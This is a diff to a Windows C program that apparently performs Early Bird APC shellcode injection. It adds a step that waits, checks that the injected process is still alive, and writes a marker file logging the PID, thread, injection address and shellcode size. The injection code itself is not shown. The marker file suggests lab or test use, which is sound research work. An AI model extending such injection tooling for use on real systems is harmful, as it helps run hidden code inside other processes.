@@ -140,8 +140,50 @@ int main(int argc, char* argv[]) {
     printf("  线程 TID: %u\n", pi.dwThreadId);
     printf("======================================\n\n");
 
-    // 等待用户确认后退出（原始实现的交互式特性）
-    printf("[*] 按 <Enter> 退出...");
+    // 创建标记文件，证明注入流程完成
+    printf("[*] 等待 5 秒，检查进程状态...\n");
+    Sleep(5000);
+
+    // 检查进程是否仍在运行
+    DWORD exitCode = 0;
+    if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
+        if (exitCode == STILL_ACTIVE) {
+            printf("[+] 进程仍在运行 - Shellcode 正在执行！\n");
+
+            // 创建成功标记文件
+            HANDLE hMarker = CreateFileA(
+                "C:\\Users\\Public\\early_bird_apc_verified.txt",
+                GENERIC_WRITE,
+                0,
+                NULL,
+                CREATE_ALWAYS,
+                FILE_ATTRIBUTE_NORMAL,
+                NULL
+            );
+
+            if (hMarker != INVALID_HANDLE_VALUE) {
+                char msg[256];
+                snprintf(msg, sizeof(msg),
+                    "Early Bird APC Injection Verified!\n"
+                    "Target Process: %s\n"
+                    "Process PID: %u\n"
+                    "Thread TID: %u\n"
+                    "Injection Address: 0x%p\n"
+                    "Shellcode Size: %u bytes\n"
+                    "Status: Process still running - shellcode executed!\n",
+                    targetProcess, pi.dwProcessId, pi.dwThreadId,
+                    shellcodeAddr, shellcodeSize);
+                DWORD written;
+                WriteFile(hMarker, msg, strlen(msg), &written, NULL);
+                CloseHandle(hMarker);
+                printf("[+] 已创建验证文件: C:\\Users\\Public\\early_bird_apc_verified.txt\n");
+            }
+        } else {
+            printf("[!] 进程已退出（退出码：%u）\n", exitCode);
+        }
+    }
+
+    printf("\n[*] 按 <Enter> 退出...");
     getchar();
 
     // 清理资源
